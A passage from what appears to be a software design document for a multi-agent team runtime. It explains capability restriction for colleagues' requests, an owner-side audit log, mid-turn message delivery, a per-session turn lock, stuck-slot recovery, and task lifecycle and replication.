  session registers, including an unrestricted one — that is what stops an
  owner inheriting a teammate's limits. Registration outlives the turn on
  purpose: a background task the turn left running reports in afterwards, and
  those calls are still the caller's.
- **A restriction the engine ignores is worse than none.** Codex takes no tool
  allow/deny lists and routes no call through `canUseTool`
  (`features.permissionRules`), so a restricted turn on it is refused outright
  rather than run with everything.
- **What a skill brings is measured, not trusted.** A loaded skill's
  `allowed-tools` join the auto-allow rules for the rest of the turn, its hooks
  run commands, and the engine loads a skill with no pre-approvals without
  reaching the gate at all. So a skill call is judged by a pre-tool hook as well
  as the gate, and a skill whose pre-approvals reach past what the session
  already settles does not load (`turn-skills.ts`; runtime DESIGN "Skills on a
  borrowed turn"). For the same reason the message a borrowed turn starts with
  never runs as an engine command — a person's message that starts a member's
  turn included, while that member's policy withholds anything. A message
  added to a turn already running is not reworded on that account: a
  teammate's arrives framed and never starts with "/", the owner's own is
  theirs to run. Words from outside this machine may join only an external
  turn; `renderMidTurnEnvelope` neutralizes command-shaped text before that
  handoff, just as the separately started external turn does.

### The owner's record (`team_tool_audit`)

What actually ran, and what was refused. Local-only by construction — it
describes the owner's computer, so it is absent from the office replication
snapshot and from the office-member HTTP allowlist, and reachable only over
desktop IPC. Written at two points that cannot double-count: the gate files
refusals, the engine's `PostToolUse` hook files what executed. Rows hold what a
call was AIMED at (the command, the path, the URL), never the payload.

The record covers every turn serving a request from outside — a colleague's
with full reach included, which is not enforced but is still someone else's
request on the owner's machine. Executed calls reach it only through the
engine's hooks, so on an engine that runs none (`features.hooks`) such a turn is
refused, as a restricted one is on an engine that takes no permission rules.
The owner's own turns, their digital humans working for each other included,
leave no rows: they keep the engine's fast path, and recording them would file
the owner's own work under a teammate's name. The hook that files executed
calls is fixed when a session is built, so a session serving such a request is
built with it (`app-chat`'s session creation context). Known bound: what a
colleague's turn, restricted or not, hands to one of the owner's own members
through `team_send`, and whatever a full-reach turn sets in motion, run as the
owner's own and are not recorded. An empty audit therefore reads "no request
from outside ran", not "nothing ran".

The shared vocabulary (which tools exist, what an unstated permission means) is
`shared/apps/capability-policy.ts`, and the enforcement is
`apps/runtime/capability-policy.ts` — the same pair the IM guest path uses, so
the two scenarios cannot drift. A capability the vocabulary does not list is
never injected for either caller: an owner cannot switch off what they were never
shown, so defaulting an unlisted server ON widened the lend every time a new one
was added. The interactive terminal is why this rule exists — it sat outside the
tables while the command tool was switchable, and a teammate could run commands
on a machine whose owner believed they had withheld exactly that.

## Reaching a member that is already working

A message to a busy member used to wait for that member's turn to end. That
sounds like a delay and is actually a permanent misalignment, because of what
else happens at that instant:

- 10:10 the lead dispatches 20 minutes of work.
- 10:20 something changes and it sends a correction. The member is busy, so the
  correction waits.
- 10:30 the member finishes — having spent ten minutes on work the correction
  would have stopped. The waiting message is delivered *now*, becoming the next
  turn's input, and the turn-end report reaches the lead at the same moment.
- The lead reacts to that report and sends again — into a member that has just
  started on the previous message. From here the two never converge: the lead is
  always talking about the member's last task, the member is always on the next.

The one moment a member can take new instructions — finished, not yet started —
is the same moment the queue fills, and the sender is woken a step too late to
use it. No amount of prompt work reaches that; the opening has to exist first.

**So a message goes into the turn that is running.** The engine takes it at the
next tool-round boundary and the turn continues to a single result — the same
mechanism that already backs a person typing while their agent works. Turn time
is nearly all model time, and tool boundaries come every few seconds, so the
worst case drops from "a whole turn" to "one model output".

What this is NOT:

- **Not an interrupt.** Nothing is cancelled and no turn is started. Whether to
  change course is the member's judgment, and the Entry says so without saying
  what to conclude ("Messages that arrive while you are working").
- **Not a different kind of message.** The same `send`, the same act on the
  office record, the same circuit charge. The branch is below all of that
  (`turn-gate`), which is what keeps the budget — the only guard against members
  interrupting each other without end — armed on exactly the path that can
  interrupt.
- **Not sender-specific.** A lead, a teammate and a person are all delivered the
  same way. Who may act on what is already in the roster and the topology; the
  envelope states who sent it and leaves the weighing to the reader.
- **Not a completion.** The message starts no turn, so nothing completes for it:
  the turn it joined completes against its own trigger. A receipted send is
  answered immediately with `'mid_turn'` for the same reason `'queued'` exists —
  the completion that would answer it belongs to a turn this message did not
  start.

**What the member reads** (`orchestration.renderMidTurnEnvelope`):

```
[Arrived while you were working — from 竞品调研 (teammate)]

<body>
```

It differs from a turn-starting envelope in two ways, both deliberate. It says
the message arrived mid-work, because the sender did not know what the member
was doing and the member must not read it as the task it was woken for. And it
carries no board digest: the digest answers "what changed since you last looked",
which belongs at the start of a turn — mid-turn it is unrelated context dropped
into live reasoning, and rendering it would advance the member's watermark past
facts it may never see. A person's words stay verbatim, exactly as when they type
into the same chat locally.

**Delivery eligibility** is determined only by equal, known permission identities.
The owner's identity (the owner, their own digital humans, the runtime), a
colleague's, a guest's and each chat guest policy's remain distinct. A human-started
turn is eligible when its identity matches. Existing queued messages of that
identity join in arrival order. During session startup they wait for the
ready notification, then join the live turn. If the model has finished tool
use, accepted input runs in the immediately following engine turn.

A member on another machine receives messages immediately on the durable ctrl
feed. Internal completion receipts preserve failure visibility without making
the sending AI wait or holding a sender-side turn reservation. The owner applies
the same gate, stamping incoming work a colleague's unless the sender says it is
a guest's (see "Where a request came from").

**The known cost.** A message handed to a running turn is context, not a queued
item: if the model reads it and does nothing, nothing records that it was read.
The office record still holds the send itself, so "was it sent" stays answerable
— "was it acted on" was never answerable for any message and is not made worse
here. Left as is deliberately, to be watched in practice rather than machinery
built for it up front.

## One turn per session — the only lock in the design

A team session key (`app-chat:{appId}:team:{teamId}:{epochId}`) runs **at most
one turn at a time**, no matter who asked for it or from which machine. The
shared gate owns that rule. Its mailbox groups equal identities in arrival
order; capacity 128 rejects new overflow explicitly rather than losing accepted
messages. Ready/ending notifications drive delivery; a recheck timer covers
missed transitions.

Two turns on one session key is not a slowdown, it is corruption, and it is
worth knowing exactly why. Both turns resolve to the **same live CC subprocess**
(the session is reused), and both call `v2Session.send()` — that part is
harmless, the SDK just enqueues onto one stdin. The damage is on the way out:
`SDKSession.stream()` hands every caller a fresh generator over **one cached
`queryIterator`**, and each generator returns on the first `result` it sees.
Two sends that the CLI folds into one turn produce ONE `result`, so one
consumer returns — possibly holding the other turn's answer — and the other
waits forever on a completion that will never come. If the two turns also differ
in tool set (the owner's own turn is unrestricted, a request from outside is
filtered by the delegated policy — `isBorrowedTeamTurn`), the input fingerprint changes and
`getOrCreateV2Session` tears the subprocess down mid-stream; the three guards
that would defer that rebuild all read the `consumers` map, which app-chat
deliberately never populates.

Team and runtime envelopes use the team gate; direct, IM and federated entries
use app-chat's permission-aware gate. Both share the same authoritative live-turn
identity and synchronous start hold. A team dispatch adopts its hold instead of
being admitted a second time by app-chat. Federation resolves timing only on the
owner, with every arriving message stamped as from outside. Completion-requesting
wakes retain their own callback, including when several messages join one
physical turn. Asynchronous sends keep internal receipt observers so admission
failures remain visible in the shared record.

### A stuck slot must be recoverable, and must never read as idle

The slot is taken at dispatch and handed back by exactly one call,
`bus.completeTurn`. That call sits at the end of a detached promise chain in
`wakeTarget`, behind bookkeeping that can throw — and a `void`-ed chain swallows
whatever it throws. The result was a session locked for the life of the process,
locked silently, and the three symptoms arrived together because they share one
cause: new messages only queued, periodic checks skipped the member as "busy",
and the board still showed it **idle**, because member status was projected from
`session.isSessionActive` — a different signal that knows nothing about the slot.
An operator reading that combination concludes the session is dead. It is the
reasonable conclusion, and it is wrong, and acting on it starts a second lead.

Three rules, and the third is the one that made the other two insufficient on
their own:

- **The completion is unconditional.** Everything around `bus.completeTurn` in
  the turn-end handler is wrapped, and the chain carries a terminal `.catch`, so
  no bookkeeping failure can keep the slot — or disappear unexplained.
- **The gate reclaims a slot it has held past a TTL** with nothing running
  (`platform/turn-gate` §7), so a completion lost some other way self-heals
  instead of needing a restart. It never reclaims one while a turn is streaming;
  that would start the second turn this lock exists to prevent.
- **Status comes from the slot.** `getMemberStatus` / `getMemberBusy` and the
  periodic-check gate all read `bus.isSessionOccupied`. A member whose slot is
  held is not available, whatever its session layer says, and saying otherwise is
  what turned a recoverable stall into a duplicated run.

## Concurrency safety — by construction

No locks anywhere else. Task writes are scoped by id, findings and activity are
append-only (activity inserts are `OR IGNORE`, so a replica echo of a row this
node authored is a no-op rather than a clash), the roster is derived. The
publish gate's ref-uniqueness check reads before it writes, which is atomic
enough on one node (a turn is single-threaded and the store is synchronous) and
deliberately best-effort across nodes — hence the reader's ambiguity refusal,
which needs no coordination to stay correct. The rule is that a gate may make a
bad state rare; only a reader that refuses to guess can make it harmless. Bus
mailboxes are per-session arrays consumed serially (one actor = one
single-threaded turn). Pending completion receipts are keyed by `correlationId`.
Overlapping writes from different actors target disjoint keys, so there is no
clobber.


## Workbench task lifetime and decisions

Business task metadata lives on its existing epoch row in apps/team and travels
inside the epoch replication envelope. There is one epoch per task, not a separate
one-to-many execution identity. Resource sealing (`stopped`) preserves business
status and allows the existing context to resume. Explicit archival completes
the task; only a subsequent human request may reopen it. A background turn cannot
reopen a completed task. IM `/clear` uses terminal `cleared` sealing, so the next
inbound message receives a new epoch and session context. Native task creation
always allocates a unique chat key, even when a member is selected.

An already-open epoch does not publish another epoch record or broadcast a team
update merely because a turn starts. Replication follows lifecycle or business
state changes; reads do not create work.

`resumeFromEscalation` returns an asynchronous admission result. The caller must
await it before resolving the persisted question. The member waiting indicator
is recomputed from remaining persisted questions rather than cleared wholesale.
Team questions are excluded from the solo automation orphan-cleanup rule, which
cannot represent several concurrent task questions. Decision receipts are
append-only coordination activities, visible after refresh and restart.

### Replicated task closure

Explicit business completion and IM context clearing close pending decisions after
local sessions have stopped, including decisions emitted during teardown. Both
local archival and an applied authority/replica epoch use the same coalesced local
resource cleanup. Replica cleanup resets the mailbox and closes local sessions
without publishing another epoch; the original lifecycle write remains the sole
replicated transition. Human resume waits until local teardown has finished.
Resource-only seals retain unanswered decisions.


### Durable decision delivery

The automation runtime persists an answer and continuation atomically before
calling `resumeFromEscalation`. Its optional `continuationId` makes the wake
identifiable and idempotent within the process. Equal-authority answers join
the running turn; other answers wait in the gate. `onStarted` fires once the
message is accepted into the live turn or its new turn starts. `onSettled`
follows that turn's actual ending, including stop/failure. A merged turn retains
each continuation callback. Closed/cleared tasks reject continuations, including
after restart. The persistent continuation remains recovery truth; accepting it
into memory does not erase the saved answer.
Resource-only cleanup keeps questions; explicit business closure cancels pending
continuations as well as unresolved questions. Stored answers remain audit facts.

### External work and a space coordinator

A space conversation runs with its owner's capabilities only. Content from
outside (a trigger with an origin), from another machine, or from a sender no
longer in the collaboration, is delivered with the `external` identity: it
never joins the owner's running turn and runs
as a turn of its own right after it, which is how every team message reached a
space coordinator before live delivery. Local member reports keep the live path.
Such a later turn still runs with owner capabilities, as it always did; scoping
it is separate work. Existing custom lead prompts are not rewritten; the
current runtime team prompt supplies the live-delivery contract.
